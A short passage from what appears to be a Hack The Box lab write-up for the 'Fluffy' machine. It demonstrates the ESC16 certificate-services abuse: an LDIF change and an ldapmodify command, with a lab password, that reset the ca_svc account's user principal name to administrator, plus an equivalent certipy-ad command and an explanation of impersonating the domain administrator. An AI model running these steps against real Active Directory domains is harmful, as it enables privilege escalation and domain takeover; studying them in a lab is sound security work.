For ESC16, you can use certipy-ad to request a certificate as a high-privileged user (like Administrator) even if you are not in the right group, due to the missing security extension.



dn: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
changetype: modify
replace: userPrincipalName
userPrincipalName: administrator

┌──(root㉿kali)-[/home/kali]
└─# ldapmodify -x -H ldap://10.10.11.69 -D "FLUFFY\p.agila" -w 'prometheusx-303' -f upn.ldif                
modifying entry "CN=certificate authority service,CN=Users,DC=fluffy,DC=htb"


or, we could have used
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'

"Then, a certificate should be requested as the ca_svc user. Since the ca_sv c user's UPN has been updated
to administrator , the resulting certificate will allow us to authenticate as the administrator user. Note
that the User template (a default template in the CA ) is used here."
